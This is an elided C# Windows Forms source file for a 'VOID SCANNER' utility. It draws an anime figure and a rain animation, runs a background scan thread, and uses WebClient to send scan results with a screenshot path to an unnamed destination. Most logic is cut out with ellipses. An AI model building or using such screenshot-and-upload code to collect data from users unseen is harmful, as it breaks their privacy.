...
namespace UltraSimpleScanner
{
    public partial class UltraSimpleScannerForm : Form
    {
        ...
        private void InitializeComponent()
        {
            ...
            // Mouse Click Event
            this.MouseClick += UltraSimpleScannerForm_MouseClick;
        }
        ...
        private void AnimePictureBox_Paint(object sender, PaintEventArgs e)
        {
            ...
            using (SolidBrush redBrush = new SolidBrush(Color.Red))
            {
                ...
                // Eyes
                e.Graphics.FillEllipse(redBrush, 320, 130, 15, 15);
                e.Graphics.FillEllipse(redBrush, 365, 130, 15, 15);
                // Hair
                e.Graphics.FillEllipse(redBrush, 290, 90, 120, 60);
                // Katana
                e.Graphics.FillRectangle(redBrush, 450, 150, 5, 100);
                e.Graphics.FillRectangle(redBrush, 440, 140, 25, 20);
            }
        ...
        private void DrawRain(Graphics g)
        {
            using (Pen rainPen = new Pen(Color.FromArgb(100, Color.Black), 1))
            {
                for (int i = 0; i < 150; i++)
                {
                    int x = (i * 5 + animationFrame) % 700;
                    int y = (animationFrame * 2 + i * 3) % 500;
                    g.DrawLine(rainPen, x, y, x, y + 25);
                }
            }
        }
        ...
        private void UltraSimpleScannerForm_MouseClick(object sender, MouseEventArgs e)
        {
        ...
        private void ScanButton_Click(object sender, EventArgs e)
        {
            ...
            // Start scanning
            Thread scanThread = new Thread(new ThreadStart(PerformScan));
            scanThread.Start();
        }
        ...
        private void SendResults(string screenshotPath)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    ...
                    string results = "VOID SCANNER - ULTRA SIMPLE SCAN COMPLETED\n" +
    ...
    public class Program
    {
        ...
        public static void Main()
        {
            ...
            Application.Run(new UltraSimpleScannerForm());
        }
    }
}
